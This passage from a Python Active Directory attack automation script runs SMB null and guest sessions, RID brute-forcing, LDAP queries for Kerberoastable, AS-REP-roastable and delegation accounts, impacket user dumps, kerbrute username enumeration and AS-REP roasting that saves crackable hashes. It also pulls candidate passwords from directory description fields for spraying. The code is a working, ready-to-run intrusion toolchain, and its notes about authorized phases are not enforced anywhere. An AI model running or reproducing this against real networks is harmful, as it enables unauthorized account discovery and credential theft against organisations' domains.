            m = re.search(key + r":\s*(.+)", t or "")
            if m:
                rows.append([key.replace("_", " "), m.group(1).strip()])
        tbl(["RDP FIELD", "VALUE"], rows, title="RDP (nmap NSE)")

    if 1433 in h.ports:
        subhead("MSSQL")
        t = _nse(h, "1433", ["ms-sql-info", "ms-sql-ntlm-info"], args, prof, "mssql",
                 timeout=90)
        rows = []
        for key in ("Version", "Product", "Instance", "TCP port", "Target_Name"):
            m = re.search(key + r":\s*(.+)", t or "")
            if m:
                rows.append([key, m.group(1).strip()])
        tbl(["MSSQL FIELD", "VALUE"], rows, title="MSSQL (nmap NSE)")

    mark(h, "nse")


def _parse_nse_smb(h, txt):
    txt = txt or ""
    for pat, a in ((r"OS:\s+([^\n]+)", "os_family"),
                   (r"Computer name:\s+([^\n]+)", "hostname"),
                   (r"NetBIOS computer name:\s+([^\n]+)", "hostname"),
                   (r"Domain name:\s+([^\n]+)", "domain"),
                   (r"Forest name:\s+([^\n]+)", "forest"),
                   (r"FQDN:\s+([^\n]+)", "fqdn")):
        m = re.search(pat, txt)
        if m and not getattr(h, a):
            setattr(h, a, m.group(1).strip())
    mt = re.search(r"System time:\s+([^\n]+)", txt) or re.search(r"date:\s+([^\n]+)", txt)
    if mt:
        h.smb["time"] = mt.group(1).strip()
    dia = re.findall(r"(SMB\s?[0-9.]+|NT LM 0\.12|2\.0\.2|2\.1\.|3\.0|3\.0\.2|3\.1\.1)", txt)
    if dia:
        h.smb["dialects"] = sorted(set(d.strip() for d in dia))
    # NSE-discovered users
    for m in re.finditer(r"\\([A-Za-z0-9._-]+)\s+\(RID:", txt):
        _add_user(h, m.group(1), "nse-smb-enum-users")
    if re.search(r"SMBv1[^\n]*enabled|NT LM 0\.12", txt, re.I):
        h.smb["smbv1"] = True
        STORE.add_finding(h.ip, "SMBv1 Enabled", "medium", "smb-protocols negotiated SMBv1",
                          "Legacy SMBv1.", ATTACK["smb-fingerprint"], CWE["smbv1"], 0.75)
    if re.search(r"[Mm]essage signing:\s+(disabled|not required)", txt):
        h.smb["signing"] = False
        STORE.add_finding(h.ip, "SMB Signing Not Required", "high",
                          "smb-security-mode: signing not required",
                          "NTLM relay exposure (verify vs OS baseline).",
                          ATTACK["smb-signing"], CWE["smb-signing"], 0.8,
                          next_step="Relay testing is a separate authorized phase.")
    elif re.search(r"[Mm]essage signing:\s+(required|enabled)", txt):
        h.smb["signing"] = True


def _parse_nse_ldap(h, txt):
    for m in re.finditer(r"(\w+):\s*(.+)", txt or ""):
        k, v = m.group(1).lower(), m.group(2).strip()
        if k in ("defaultnamingcontext", "rootdomainnamingcontext", "dnshostname",
                 "servername", "configurationnamingcontext", "schemanamingcontext",
                 "domainfunctionality", "forestfunctionality",
                 "domaincontrollerfunctionality"):
            h.ldap[k] = v
    dn = h.ldap.get("defaultnamingcontext")
    if dn:
        h.ldap_base = h.ldap_base or dn
        dom = ".".join(p[3:] for p in dn.split(",") if p.upper().startswith("DC="))
        if dom and not h.domain:
            h.domain = dom


# ============================================================================
#  PHASE 3 — SMB NULL / ANONYMOUS CASCADE
# ============================================================================
def phase_smb_null(h, args, prof, inp):
    if done(h, "smb-null"):
        return
    if 445 not in h.ports and 139 not in h.ports:
        return
    head(f"SMB Null / Anonymous Cascade · {h.ip}")
    nxc = nxc_bin()
    null_ok = False
    if nxc:
        rc, txt = run([nxc, "smb", h.ip, "-u", "", "-p", ""], timeout=40)
        ev(h, "null-session", [nxc, "smb", h.ip, "-u", "''", "-p", "''"], txt)
        _parse_nxc_fp(h, txt)
        null_ok = bool(re.search(r"\[\+\]", txt)) or "Null Auth:True" in txt
    if IMPACKET_LIB and not null_ok:
        try:
            c = SMBConnection(h.ip, h.ip, timeout=8)
            c.login("", "")
            null_ok = True
            c.logoff()
        except Exception:
            pass
    h.auth["smb_null"] = null_ok
    if null_ok:
        crit("Null session AVAILABLE — cascading anonymous SMB enumeration")
        STORE.add_finding(h.ip, "Anonymous SMB (Null Session)", "high",
                          "Anonymous SMB bind succeeded", "Unauthenticated exposure.",
                          ATTACK["null-session"], CWE["null-session"], 0.9)
    elif nxc:
        rc, txt = run([nxc, "smb", h.ip, "-u", "guest", "-p", ""], timeout=40)
        if re.search(r"\[\+\]", txt):
            h.auth["smb_guest"] = null_ok = True
            ok("Guest logon accepted (empty password)")
    if not null_ok:
        tbl(["STEP", "RESULT"], [["null session (-u '' -p '')", "DENIED"],
                                 ["guest logon", "DENIED"]],
            title="SMB anonymous access")
        info("Anonymous access denied — NOT 'nothing can be learned': RID-brute "
             "(authed) and kerbrute (with a userlist) can still surface users.")
        mark(h, "smb-null")
        return
    smb_enumerate(h, prof, anon=True)
    if IMPACKET_LIB:
        _impacket_anon_rpc(h)
    mark(h, "smb-null")


def smb_enumerate(h, prof, anon=True, username="", password="", nthash="",
                  domain="", local_auth=False):
    """Full read-only SMB enumeration. Builds a per-step STATUS table so every
    capability (success/denied/count) is visible, then renders shares + users +
    password policy. Shared by the null cascade and the authed re-enum."""
    nxc = nxc_bin()
    if not nxc:
        skip("NetExec/CME not installed — SMB enumeration limited to impacket")
        return
    a = (nxc_auth() if anon else
         nxc_auth(username, password, nthash, domain or h.domain or "", local_auth))
    label = "anonymous" if anon else f"auth:{username}"
    steps = []

    def cap_status(txt, parse_ok):
        if "STATUS_ACCESS_DENIED" in txt:
            return "ACCESS_DENIED"
        if "STATUS_LOGON_FAILURE" in txt:
            return "LOGON_FAILURE"
        if txt.strip() == "" or "[tool-not-installed]" in txt:
            return "no output"
        return parse_ok

    n0 = len(h.shares)
    rc, txt = run([nxc, "smb", h.ip] + a + ["--shares"], timeout=90)
    ev(h, "smb-shares", [nxc, "smb", h.ip] + a + ["--shares"], txt, label)
    _parse_shares(h, txt)
    if anon:
        h.auth["null_shares"] = bool(h.shares)
    steps.append([f"shares [{label}]", cap_status(txt, f"{len(h.shares) - n0} share(s)")])

    optmap = [("--users", "users"), ("--groups", "groups"),
              ("--pass-pol", "password policy"), ("--local-groups", "local groups"),
              ("--sessions", "sessions"), ("--loggedon-users", "logged-on users")]
    for opt, cap in optmap:
        if not nxc_supports("smb", opt):
            steps.append([cap, "unsupported by installed nxc"])
            continue
        before = len(h.users)
        rc, txt = run([nxc, "smb", h.ip] + a + [opt], timeout=90)
        ev(h, "smb" + opt, [nxc, "smb", h.ip] + a + [opt], txt, label)
        if opt == "--users":
            _parse_users(h, txt, "nxc-smb")
            if anon and len(h.users) > before:
                h.auth["null_users"] = True
            steps.append([cap, cap_status(txt, f"{len(h.users) - before} user(s)")])
        elif opt == "--pass-pol":
            _parse_passpol(h, txt)
            if anon and "password_policy" in h.smb:
                h.auth["null_passpol"] = True
            pol = h.smb.get("password_policy", {})
            steps.append([cap, cap_status(
                txt, f"min_len={pol.get('min_length', '?')} "
                     f"lockout={pol.get('lockout_threshold', '?')}")])
        else:
            steps.append([cap, cap_status(txt, "retrieved")])
        prof.jitter()

    if nxc_supports("smb", "--rid-brute") and (prof.rid_brute or not anon):
        before = len(h.users)
        rc, txt = run([nxc, "smb", h.ip] + a + ["--rid-brute"], timeout=200)
        ev(h, "rpc-lsarpc-rid", [nxc, "smb", h.ip] + a + ["--rid-brute"], txt, label)
        _parse_rid(h, txt)
        steps.append(["RID brute (SAMR/LSA)",
                      cap_status(txt, f"{len(h.users) - before} user(s)")])
    elif nxc_supports("smb", "--rid-brute"):
        steps.append(["RID brute", "skipped (stealthy anon) — runs authed / --approach noisy"])

    tbl(["SMB CAPABILITY", "RESULT"], steps, title=f"SMB enumeration cascade [{label}]")
    _render_shares(h)
    _render_users(h)


def _impacket_anon_rpc(h):
    try:
        c = SMBConnection(h.ip, h.ip, timeout=8)
        c.login("", "")
        try:
            for s in c.listShares():
                nm = s["shi1_netname"][:-1]
                if not any(x.get("name") == nm for x in h.shares):
                    h.shares.append({"name": nm, "remark": s["shi1_remark"][:-1],
                                     "source": "impacket"})
        except Exception:
            pass
        try:
            _samr(c, h)
        except Exception:
            pass
        c.logoff()
    except Exception as e:
        info(f"anonymous SMB (impacket): {type(e).__name__}")


def _samr(conn, h):
    rpct = transport.SMBTransport(conn.getRemoteHost(), conn.getRemoteHost(),
                                  filename=r"\samr", smb_connection=conn)
    dce = rpct.get_dce_rpc()
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)
    srv = samr.hSamrConnect(dce)["ServerHandle"]
    for d in samr.hSamrEnumerateDomainsInSamServer(dce, srv)["Buffer"]["Buffer"]:
        if d["Name"].lower() == "builtin":
            continue
        try:
            rid = samr.hSamrLookupDomainInSamServer(dce, srv, d["Name"])["DomainId"]
            dh = samr.hSamrOpenDomain(dce, srv, domainId=rid)["DomainHandle"]
            for u in samr.hSamrEnumerateUsersInDomain(dce, dh)["Buffer"]["Buffer"]:
                _add_user(h, u["Name"], "samr")
        except Exception:
            continue
    dce.disconnect()


# ============================================================================
#  PHASE 4 — DOMAIN / FOREST IDENTITY
# ============================================================================
def phase_identity(h, args):
    if done(h, "identity"):
        return
    head(f"Domain / Forest Identity · {h.ip}")
    if any(p in h.ports for p in (389, 636, 3268, 3269)) and LDAP3_LIB:
        try:
            srv = Server(h.ip, get_info=ALL, connect_timeout=8)
            c = Connection(srv, auto_bind=True, receive_timeout=10)
            o = getattr(getattr(c.server, "info", None), "other", {}) or {}
            if o.get("defaultNamingContext"):
                dn = o["defaultNamingContext"][0]
                h.ldap_base = h.ldap_base or dn
                dom = ".".join(p[3:] for p in dn.split(",") if p.upper().startswith("DC="))
                if dom and not h.domain:
                    h.domain = dom
            if o.get("rootDomainNamingContext"):
                rn = o["rootDomainNamingContext"][0]
                h.forest = h.forest or ".".join(p[3:] for p in rn.split(",")
                                                 if p.upper().startswith("DC="))
            if o.get("dnsHostName"):
                h.fqdn = h.fqdn or o["dnsHostName"][0]
            c.unbind()
        except Exception as e:
            info(f"LDAP RootDSE: {type(e).__name__}")
    if 53 in h.ports and h.domain and not args.no_graph:
        _dns_srv(h)
    if h.domain and not h.netbios_domain:
        h.netbios_domain = h.domain.split(".")[0].upper()
    tbl(["FIELD", "VALUE"], [["Domain", h.domain or "-"], ["Forest", h.forest or "-"],
        ["NetBIOS", h.netbios_domain or "-"], ["FQDN", h.fqdn or "-"],
        ["Base DN", h.ldap_base or "-"]], title="Identity")
    mark(h, "identity")


def _dns_srv(h):
    for q in (f"_ldap._tcp.dc._msdcs.{h.domain}", f"_kerberos._tcp.dc._msdcs.{h.domain}",
              f"_gc._tcp.{h.domain}", f"_ldap._tcp.{h.domain}"):
        if have("dig"):
            rc, txt = run(["dig", "+short", "SRV", q, f"@{h.ip}"], timeout=15)
        elif have("nslookup"):
            rc, txt = run(["nslookup", "-type=SRV", q, h.ip], timeout=15)
        else:
            return
        for m in re.finditer(r"([A-Za-z0-9.-]+)\.\s*$", txt.strip(), re.M):
            cand = m.group(1).rstrip(".")
            if cand and "." in cand and not is_ip(cand):
                ip = resolve(cand)
                if ip and ip != h.ip:
                    ok(f"SRV {q} -> {cand} ({ip})")
                    STORE.enqueue(cand)


# ============================================================================
#  PHASE 5 — LDAP (null/anon + authenticated; usernames + attack surface)
# ============================================================================
LDAP_Q = {
    "users": ("(&(objectCategory=person)(objectClass=user))",
              ["sAMAccountName", "userPrincipalName", "description",
               "servicePrincipalName", "userAccountControl", "adminCount"]),
    "groups": ("(objectCategory=group)", ["sAMAccountName", "adminCount"]),
    "computers": ("(objectCategory=computer)", ["dNSHostName", "operatingSystem"]),
    "trusts": ("(objectClass=trustedDomain)", ["name", "trustDirection", "trustType"]),
    "spn": ("(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)"
            "(!(sAMAccountName=krbtgt)))", ["sAMAccountName", "servicePrincipalName"]),
    "asrep": ("(&(objectCategory=person)(objectClass=user)"
              "(userAccountControl:1.2.840.113556.1.4.803:=4194304))", ["sAMAccountName"]),
    "unconstr": ("(userAccountControl:1.2.840.113556.1.4.803:=524288)",
                 ["sAMAccountName", "dNSHostName"]),
    "constr": ("(msDS-AllowedToDelegateTo=*)",
               ["sAMAccountName", "msDS-AllowedToDelegateTo"]),
    "rbcd": ("(msDS-AllowedToActOnBehalfOfOtherIdentity=*)", ["sAMAccountName"]),
    "adcs": ("(objectClass=pKIEnrollmentService)",
             ["cn", "dNSHostName", "certificateTemplates"]),
    "laps": ("(&(objectCategory=computer)(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*)))", ["cn"]),
    "gmsa": ("(objectClass=msDS-GroupManagedServiceAccount)", ["sAMAccountName"]),
    "maq": ("(objectClass=domain)", ["ms-DS-MachineAccountQuota"]),
    "desc_pw": ("(&(objectClass=user)(|(description=*pass*)(description=*pwd*)"
                "(description=*cred*)))", ["sAMAccountName", "description"]),
}
LDAP_LABELS = {
    "users": "User objects", "groups": "Group objects", "computers": "Computer objects",
    "trusts": "Domain trusts", "spn": "Kerberoastable (SPN set)",
    "asrep": "AS-REP roastable (no pre-auth)", "unconstr": "Unconstrained delegation",
    "constr": "Constrained delegation", "rbcd": "Resource-based constr. deleg.",
    "adcs": "AD CS enrollment svc", "laps": "LAPS-readable computers",
    "gmsa": "gMSA accounts", "maq": "MachineAccountQuota obj",
    "desc_pw": "Creds-in-description",
}


def phase_ldap(h, inp, args, authed, cred=None):
    """LDAP enumeration. When authed, `cred` is a dict {username,password,nthash}
    (falls back to inp). Anonymous path is the LDAP null session."""
    tag = "ldap-auth" if authed else "ldap-anon"
    if done(h, tag) or args.no_ldap:
        return
    if not any(p in h.ports for p in (389, 636, 3268, 3269)):
        return
    head(f"LDAP {'Authenticated' if authed else 'NULL/Anonymous'} "
         f"Enumeration · {h.ip}")
    dom = h.domain or inp.domain or args.domain or ""
    base = h.ldap_base or (",".join(f"DC={p}" for p in dom.split(".")) if dom else "")
    if not base:
        warn("No base DN — skipping LDAP")
        mark(h, tag)
        return
    info(f"Base DN: {base}")

    if not LDAP3_LIB:
        _ldap_cli_fallback(h, inp, args, base, dom, authed, cred)
        mark(h, tag)
        return

    user = pw_user = ""
    secret = None
    if authed:
        cred = cred or {"username": inp.username, "password": inp.password,
                        "nthash": inp.nthash}
        if not cred.get("username"):
            mark(h, tag)
            return
        user = cred["username"]
    conn = None
    auth_state = "anonymous"
    try:
        srv = Server(h.ip, get_info=ALL, connect_timeout=8)
        if authed:
            pw = (f"{'0' * 32}:{cred['nthash'].split(':')[-1]}" if cred.get("nthash")
                  else cred.get("password", ""))
            conn = Connection(srv, user=f"{dom}\\{user}", password=pw,
                              authentication=NTLM, auto_bind=True, receive_timeout=20)
            auth_state = f"auth:{user}"
            ok(f"LDAP authenticated bind as {dom}\\{user}")
        else:
            conn = Connection(srv, authentication=ANONYMOUS, auto_bind=True,
                              receive_timeout=10)
            h.auth["ldap_anon"] = True
            ok("LDAP ANONYMOUS bind succeeded (LDAP null session)")
            STORE.add_finding(h.ip, "Anonymous LDAP Bind", "medium",
                              "Anonymous LDAP bind returned a usable connection",
                              "Directory metadata/possibly objects without auth.",
                              ATTACK["ldap-null"], CWE["anon-ldap"], 0.8)
    except Exception as e:
        if authed:
            warn(f"LDAP auth bind failed: {type(e).__name__}")
        else:
            h.auth["ldap_anon"] = False
            info(f"LDAP anonymous bind denied: {type(e).__name__}")
        mark(h, tag)
        return

    if h.ldap:
        tbl(["ROOTDSE", "VALUE"], [[k, v] for k, v in h.ldap.items()], title="LDAP RootDSE")

    counts = {}
    rows = []
    before_users = len(h.users)
    for key, (filt, attrs) in LDAP_Q.items():
        n = 0
        status = "0"
        try:
            conn.search(base, filt, SUBTREE, attributes=attrs, paged_size=500)
            data = []
            for e in conn.entries:
                row = {"dn": str(e.entry_dn)}
                for a in attrs:
                    try:
                        v = e[a].values
                        row[a] = v if len(v) > 1 else (v[0] if v else "")
                    except Exception:
                        row[a] = ""
                data.append(row)
            n = len(data)
            if data:
                counts[key] = n
                _merge_ldap(h, key, data)
            status = str(n)
        except Exception as e:
            status = f"error: {type(e).__name__}"
        rows.append([LDAP_LABELS.get(key, key), status])
    ev(h, "ldap-users", f"ldap3 deep queries ({len(LDAP_Q)})", json.dumps(counts), auth_state)
    tbl(["LDAP QUERY", "COUNT / RESULT"], rows, title=f"LDAP enumeration ({auth_state})")
    new_u = len(h.users) - before_users
    if new_u > 0:
        ok(f"LDAP username enumeration: +{new_u} user(s) from the directory")
        STORE.add_finding(h.ip, "LDAP Username Enumeration", "medium",
                          f"{new_u} usernames read via {auth_state} LDAP", "",
                          ATTACK["ldap-users"], "", 0.85, "validated")
    if auth_state == "anonymous" and not counts:
        info("Anonymous bind allowed but the directory returns no objects to it "
             "(hardened AD) — users will come from RID-brute / kerbrute instead.")
    try:
        conn.unbind()
    except Exception:
        pass
    _render_users(h)
    mark(h, tag)


def _ldap_cli_fallback(h, inp, args, base, dom, authed, cred):
    """ldapsearch CLI fallback when python-ldap3 is unavailable."""
    if not have("ldapsearch"):
        skip("ldap3 and ldapsearch both unavailable — LDAP deep queries skipped")
        return
    if authed:
        cred = cred or {"username": inp.username, "password": inp.password}
        if not cred.get("username") or not cred.get("password"):
            return
        binddn = f"{cred['username']}@{dom}" if dom else cred["username"]
        auth = ["-D", binddn, "-w", cred["password"]]
        state = f"auth:{cred['username']}"
    else:
        auth = ["-x"]
        state = "anonymous"
    cmd = ["ldapsearch", "-H", f"ldap://{h.ip}", "-b", base] + auth + \
          ["(&(objectCategory=person)(objectClass=user))", "sAMAccountName"]
    rc, txt = run(cmd, timeout=120)
    ev(h, "ldap-users", cmd, txt, state)
    before = len(h.users)
    for m in re.finditer(r"sAMAccountName:\s*(\S+)", txt):
        _add_user(h, m.group(1), "ldapsearch")
    tbl(["LDAP (ldapsearch)", "RESULT"],
        [["bind", "ok" if "sAMAccountName" in txt or rc == 0 else "denied"],
         ["users", f"+{len(h.users) - before}"]],
        title=f"LDAP enumeration ({state})")
    _render_users(h)


def _merge_ldap(h, key, rows):
    if key == "users":
        for r in rows:
            _add_user(h, r.get("sAMAccountName", ""), "ldap")
    elif key == "groups":
        for r in rows:
            nm = r.get("sAMAccountName", "")
            if nm and not any(g.get("name") == nm for g in h.groups):
                h.groups.append({"name": nm, "adminCount": r.get("adminCount", "")})
    elif key == "computers":
        for r in rows:
            nm = r.get("dNSHostName") or r.get("dn")
            if nm and not any(c.get("name") == nm for c in h.computers):
                h.computers.append({"name": nm, "os": r.get("operatingSystem", "")})
    elif key == "trusts":
        h.trusts = rows
        STORE.add_finding(h.ip, "Domain Trusts", "informational", f"{len(rows)} trust(s)",
                          "Expands identity graph.", ATTACK["ldap-trusts"], "", 0.85)
    elif key == "spn":
        for r in rows:
            if not any(s.get("account") == r.get("sAMAccountName") for s in h.spn_accounts):
                h.spn_accounts.append({"account": r.get("sAMAccountName"),
                                       "spn": r.get("servicePrincipalName")})
        STORE.add_finding(h.ip, "Kerberoastable Accounts", "high",
                          f"{len(rows)} user account(s) with SPNs",
                          "Service accounts — Kerberoast candidates.",
                          ATTACK["kerberoast"], CWE["kerberoast"], 0.9,
                          next_step="Kerberoast executed in Phase 6B when a cred is held.")
    elif key == "asrep":
        for r in rows:
            if not any(a.get("username") == r.get("sAMAccountName") for a in h.asrep_accounts):
                h.asrep_accounts.append({"username": r.get("sAMAccountName")})
        STORE.add_finding(h.ip, "AS-REP Roastable Accounts", "high",
                          f"{len(rows)} account(s) without pre-auth",
                          "DONT_REQUIRE_PREAUTH set.", ATTACK["asrep"], CWE["asrep"], 0.9,
                          next_step="AS-REP roast executed automatically in Phase 6A.")
    elif key in ("unconstr", "constr", "rbcd"):
        h.delegation.append({"type": key, "entries": rows})
        STORE.add_finding(h.ip, f"Delegation ({key})", "high", f"{len(rows)} object(s)",
                          "Delegation attack-path condition.", ATTACK["ldap-delegation"], "",
                          0.85, next_step="Delegation abuse is a later authorized phase.")
    elif key == "adcs":
        h.adcs["cas"] = rows
        STORE.add_finding(h.ip, "AD CS Present", "informational", f"{len(rows)} CA(s)",
                          "Run certipy find.", ATTACK["adcs"], "", 0.85,
                          next_step="See playbook: certipy find -vulnerable.")
    elif key == "laps" and rows:
        h.laps = rows
        STORE.add_finding(h.ip, "LAPS Readable", "high",
                          f"{len(rows)} computer(s) expose LAPS to this principal",
                          "Readable local-admin passwords.", ATTACK["laps"],
                          CWE["desc-password"], 0.85)
    elif key == "gmsa" and rows:
        h.gmsa = rows
        STORE.add_finding(h.ip, "gMSA Accounts", "medium", f"{len(rows)} gMSA",
                          "Managed service accounts.", ATTACK["gmsa"], "", 0.8)
    elif key == "maq":
        for r in rows:
            try:
                h.maq = int(r.get("ms-DS-MachineAccountQuota", "0"))
            except Exception:
                h.maq = None
            if h.maq:
                STORE.add_finding(h.ip, "Non-zero MachineAccountQuota", "medium",
                                  f"MAQ={h.maq}", "Users may add computer accounts.",
                                  ATTACK["maq"], "", 0.8)
    elif key == "desc_pw" and rows:
        for r in rows[:20]:
            crit(f"Possible cred in description: {r.get('sAMAccountName')} :: "
                 f"{truncate(str(r.get('description')), 100)}")
            # harvest description as a candidate password for spraying
            _harvest_desc_secret(h, r.get("description"))
        STORE.add_finding(h.ip, "Credentials in AD Descriptions", "high",
                          f"{len(rows)} description(s) contain pass/pwd/cred",
                          "Cleartext secrets in directory.", ATTACK["desc-creds"],
                          CWE["desc-password"], 0.8)


def _harvest_desc_secret(h, desc):
    if not desc:
        return
    h.__dict__.setdefault("_desc_secrets", [])
    for tok in re.split(r"\s+", str(desc)):
        if 4 <= len(tok) <= 64 and any(ch.isdigit() for ch in tok):
            if tok not in h.__dict__["_desc_secrets"]:
                h.__dict__["_desc_secrets"].append(tok)


# ============================================================================
#  PHASE 6 — RPC / IMPACKET  (never prompts: -no-pass / inline creds / DEVNULL)
# ============================================================================
def phase_impacket(h, inp, args, cred=None):
    if done(h, "impacket") or args.no_impacket:
        return
    head(f"RPC / Impacket Low-Level Enumeration · {h.ip}")
    dom = h.domain or inp.domain or args.domain or ""
    cred = cred or ({"username": inp.username, "password": inp.password,
                     "nthash": inp.nthash} if inp.has_cred else None)
    rows = []

    if 135 in h.ports or 445 in h.ports:
        subhead("rpcdump (RPC endpoints)")
        t = impacket_tool("rpcdump")
        if t:
            rc, txt = run([t, h.ip], timeout=60)
            ev(h, "rpc-endpoints", [t, h.ip], txt)
            ifs = sorted(set(re.findall(r"Protocol:\s*(.+)", txt)))
            if ifs:
                h.rpc["interfaces"] = ifs[:40]
            rows.append(["rpcdump", f"{len(ifs)} RPC interface(s)" if ifs else "no data"])
        else:
            rows.append(["rpcdump", "impacket-rpcdump not installed"])

    if 445 in h.ports:
        subhead("lookupsid (SID / principal enumeration)")
        t = impacket_tool("lookupsid")
        if t:
            # Always anonymous/guest first with -no-pass (stdin closed → never prompts).
            tgts = [(f"guest@{h.ip}", ["-no-pass"])]
            if dom:
                tgts.insert(0, (f"{dom}/guest@{h.ip}", ["-no-pass"]))
            if cred and cred.get("password"):
                tgts.insert(0, (f"{dom}/{cred['username']}:{cred['password']}@{h.ip}", []))
            got = False
            for tgt, extra in tgts:
                rc, txt = run([t, tgt] + extra, timeout=120)
                if "Domain SID" in txt or re.search(r"\d+:\s+\S+\\", txt):
                    ev(h, "rpc-lsarpc-rid", [t, tgt] + extra, txt,
                       "auth" if ":" in tgt else "anonymous")
                    _parse_lookupsid(h, txt)
                    got = True
                    break
            rows.append(["lookupsid", f"SID {h.sid}" if h.sid
                         else ("users found" if got else "denied")])
        else:
            rows.append(["lookupsid", "impacket-lookupsid not installed"])

    if 445 in h.ports:
        subhead("samrdump (SAMR metadata)")
        t = impacket_tool("samrdump")
        if t:
            # Always include -no-pass for the anonymous/guest attempt so it never
            # sits on an interactive "Password:" prompt (stdin is closed too).
            if cred and cred.get("password"):
                tgt, extra = f"{dom}/{cred['username']}:{cred['password']}@{h.ip}", []
            elif dom:
                tgt, extra = f"{dom}/guest@{h.ip}", ["-no-pass"]
            else:
                tgt, extra = f"guest@{h.ip}", ["-no-pass"]
            rc, txt = run([t, tgt] + extra, timeout=120)
            n0 = len(h.users)
            if "Found user" in txt:
                ev(h, "rpc-samr-users", [t, tgt] + extra, txt)
                for m in re.finditer(r"Found user:\s+(\S+)", txt):
                    _add_user(h, m.group(1), "samrdump")
            rows.append(["samrdump", f"+{len(h.users) - n0} user(s)"
                         if len(h.users) > n0 else "no users / access denied"])
        else:
            rows.append(["samrdump", "impacket-samrdump not installed"])

    if dom and cred:
        subhead("GetADUsers (authenticated directory dump)")
        t = impacket_tool("GetADUsers")
        if t:
            cr = (f"{dom}/{cred['username']}:{cred['password']}" if cred.get("password")
                  else f"{dom}/{cred['username']}")
            cmd = [t, cr, "-dc-ip", h.ip, "-all"]
            if cred.get("nthash"):
                cmd += ["-hashes", cred["nthash"]]
            rc, txt = run(cmd, timeout=180)
            ev(h, "ldap-users", cmd, txt, f"auth:{cred['username']}")
            n0 = len(h.users)
            for m in re.finditer(r"^(\S+)\s+\d{4}-\d{2}-\d{2}", txt, re.M):
                _add_user(h, m.group(1), "GetADUsers")
            rows.append(["GetADUsers", f"+{len(h.users) - n0} user(s)"])

    tbl(["TOOL", "RESULT"], rows, title="Impacket summary")
    _render_users(h)
    mark(h, "impacket")


def _parse_lookupsid(h, txt):
    m = re.search(r"Domain SID is:\s+(\S+)", txt)
    if m:
        h.sid = m.group(1)
        ok(f"Domain SID: {h.sid}")
    for m in re.finditer(r"\d+:\s+\S+\\(\S+)\s+\(SidTypeUser\)", txt):
        _add_user(h, m.group(1), "lookupsid")


# ============================================================================
#  PHASE 7 — KERBEROS USERNAME ENUMERATION (kerbrute; timeout + no-timeout)
# ============================================================================
def phase_kerb_userenum(h, args, prof, inp):
    if done(h, "kerb-userenum"):
        return
    if 88 not in h.ports:
        mark(h, "kerb-userenum")
        return
    dom = h.domain or inp.domain or args.domain
    if not dom:
        skip("Kerberos userenum needs a domain")
        mark(h, "kerb-userenum")
        return
    ul = resolve_list(inp.userlist, "userlist")
    if not ul:
        skip("No userlist for Kerberos userenum (kerbrute only runs with --userlist)")
        mark(h, "kerb-userenum")
        return
    head(f"Kerberos Username Enumeration (kerbrute) · {h.ip}")
    found: Set[str] = set()
    kb = which_any("kerbrute")
    if kb:
        os.makedirs(args.output, exist_ok=True)
        out = os.path.join(args.output, f"kerbrute_{h.ip}.out")
        cmd = [kb, "userenum", "-d", dom, "--dc", h.ip, "-o", out, ul]
        if prof.name == "stealthy":
            cmd += ["--delay", "200"]
        timeout = None if args.no_kerbrute_timeout else args.kerbrute_timeout
        info(" ".join(cmd) +
             (f"   (timeout {timeout}s; a {args.kerbrute_timeout // 60}-min notice prints"
              f" while it runs)" if timeout else "   (NO timeout — runs to completion)"))
        rc, txt = run_monitored(cmd, timeout, "kerbrute",
                                notice_at=min(300, args.kerbrute_timeout) if timeout else 300)
        full = txt
        try:
            if os.path.exists(out):
                full += "\n" + open(out, errors="ignore").read()
        except Exception:
            pass
        ev(h, "kerberos-userenum", cmd, full)
        for pat in (r"VALID USERNAME:\s+(\S+)", r"\[\+\]\s+(\S+)@"):
            for m in re.finditer(pat, full):
                found.add(m.group(1).split("@")[0])
    else:
        warn("kerbrute not found in PATH — falling back to impacket GetNPUsers for userenum")
        gnp = impacket_tool("GetNPUsers")
        if gnp:
            cmd = [gnp, f"{dom}/", "-usersfile", ul, "-dc-ip", h.ip, "-no-pass",
                   "-format", "hashcat"]
            timeout = None if args.no_kerbrute_timeout else max(args.kerbrute_timeout, 120)
            rc, txt = run(cmd, timeout=timeout or 999999)
            ev(h, "kerberos-userenum", cmd, txt)
            for m in re.finditer(r"\$krb5asrep\$\d+\$([^@:]+)", txt):
                found.add(m.group(1))
                _add_asrep_hash(h, m.group(1), txt)
            for m in re.finditer(r"KDC_ERR_PREAUTH_REQUIRED.*?for\s+(\S+)", txt):
                found.add(m.group(1))
    for u in sorted(found):
        _add_user(h, u, "kerberos", dom)
    if found:
        crit(f"{len(found)} username(s) validated via Kerberos")
        STORE.add_finding(h.ip, "Kerberos Username Enumeration", "medium",
                          f"{len(found)} usernames validated", "",
                          ATTACK["kerberos-userenum"], "", 0.9, "validated")
        _save_users(h, args)
    else:
        info("No Kerberos usernames validated from the supplied userlist")
    _render_users(h)
    mark(h, "kerb-userenum")


# ============================================================================
#  PHASE 6A — AS-REP ROASTING  (executed; crack if a wordlist is present)
# ============================================================================
def phase_asrep(h, inp, args, prof):
    if done(h, "asrep") or args.safe:
        return
    if 88 not in h.ports:
        mark(h, "asrep")
        return
    dom = h.domain or inp.domain or args.domain or ""
    if not dom:
        mark(h, "asrep")
        return
    head(f"AS-REP Roasting · {h.ip}")
    gnp = impacket_tool("GetNPUsers")
    nxc = nxc_bin()
    os.makedirs(args.output, exist_ok=True)
    hashfile = os.path.join(args.output, f"asrep_{h.ip}.hash")
    got = 0

    # Source of candidate users: explicit AS-REP list → discovered users → userlist file.
    users = [a["username"] for a in h.asrep_accounts] or h.user_names()
    userfile = None
    if users:
        userfile = os.path.join(args.output, f"asrep_users_{h.ip}.txt")
        try:
            open(userfile, "w", encoding="utf-8").write("\n".join(users) + "\n")
        except Exception:
            userfile = None
    if not userfile:
        userfile = resolve_list(inp.userlist, "userlist")

    if gnp and userfile:
        cmd = [gnp, f"{dom}/", "-usersfile", userfile, "-dc-ip", h.ip, "-no-pass",
               "-format", "hashcat", "-outputfile", hashfile]
        info(" ".join(cmd))
        rc, txt = run(cmd, timeout=600)
        ev(h, "asrep", cmd, txt)
        for m in re.finditer(r"(\$krb5asrep\$[^\s]+)", txt):
            got += _add_asrep_hash(h, None, m.group(1))
        # also read the outputfile
        try:
            if os.path.exists(hashfile):
                for ln in open(hashfile, errors="ignore"):
                    if ln.strip().startswith("$krb5asrep$"):
                        got += _add_asrep_hash(h, None, ln.strip())
        except Exception:
            pass
